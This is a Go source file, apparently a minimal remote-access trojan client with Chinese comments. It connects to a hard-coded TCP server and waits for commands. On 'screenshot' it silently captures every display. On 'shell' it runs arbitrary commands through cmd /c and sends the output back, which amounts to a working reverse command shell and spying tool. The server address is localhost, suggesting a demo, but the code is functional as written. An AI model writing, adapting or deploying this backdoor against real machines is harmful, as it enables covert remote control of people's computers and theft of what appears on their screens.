package main

import (
	"context"
	"fmt"
	"github.com/kbinani/screenshot"
	_ "image"
	_ "image/jpeg"
	"image/png"
	_ "image/png"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

func ScreenShot(conn *net.Conn) error {
	fmt.Println("开始截图...")
	n := screenshot.NumActiveDisplays()

	// 创建临时目录（如果不存在）
	screenshotDir := "C:/temp/screenshots"
	os.MkdirAll(screenshotDir, os.ModePerm)

	// 清理旧截图
	files, _ := ioutil.ReadDir(screenshotDir)
	for _, f := range files {
		if strings.HasPrefix(f.Name(), "screen_") {
			os.Remove(filepath.Join(screenshotDir, f.Name()))
		}
	}

	// 为每个显示器创建一个截图文件
	var filePaths []string

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			fmt.Println("截图失败:", err)
			continue
		}

		// 创建文件
		filename := fmt.Sprintf("screen_%d.png", i)
		filePath := filepath.Join(screenshotDir, filename)
		file, err := os.Create(filePath)
		if err != nil {
			fmt.Println("创建文件失败:", err)
			continue
		}

		// 编码为PNG
		if err := png.Encode(file, img); err != nil {
			fmt.Println("PNG编码失败:", err)
			file.Close()
			continue
		}

		file.Close()
		filePaths = append(filePaths, filePath)
		fmt.Println("已保存截图:", filePath)
	}

	if len(filePaths) == 0 {
		return fmt.Errorf("没有成功创建任何截图")
	}

	// 发送所有截图文件路径
	message := "SCREENSHOT_FILES:" + strings.Join(filePaths, ";")
	_, err := (*conn).Write([]byte(message))
	if err != nil {
		fmt.Println("发送文件路径失败:", err)
		return err
	}

	return nil
}

func Conn(conn *net.Conn) {
	// 使用动态缓冲区
	buf := make([]byte, 1024*1024) // 1MB缓冲区

	for {
		n, err := (*conn).Read(buf)
		if err != nil {
			fmt.Println("读取命令出错:", err)
			// 可以添加重连逻辑
			return // 或 continue 视情况而定
		}

		command := string(buf[:n])
		fmt.Println("收到命令:", command)

		if command == "screenshot" {
			err := ScreenShot(conn)
			if err != nil {
				fmt.Println("截图失败:", err)
				// 可以向服务器发送错误消息
				(*conn).Write([]byte("截图失败: " + err.Error()))
			}
		} else if strings.HasPrefix(command, "shell") {
			err := doCMD(conn, command)
			if err != nil {
				fmt.Println("执行命令失败:", err)
			}
		} else {
			fmt.Println("未知命令:", command)
		}
	}
}

func doCMD(conn *net.Conn, command string) error {
	// 添加命令执行超时控制
	trim := strings.TrimPrefix(command, "shell")
	trim = strings.TrimSpace(trim)

	// 创建带超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "cmd", "/c", trim)
	output, err := cmd.CombinedOutput() // 同时捕获标准输出和错误

	if err != nil {
		errMsg := fmt.Sprintf("命令执行失败: %s\n%s", err, output)
		(*conn).Write([]byte(errMsg))
		return err
	}

	_, err = (*conn).Write(output)
	return err
}

const ServerIP string = "127.0.0.1:80"

func main() {
	dial, err := net.Dial("tcp", ServerIP)
	if err != nil {
		fmt.Println(err)
	}
	go Conn(&dial)
	select {}
}
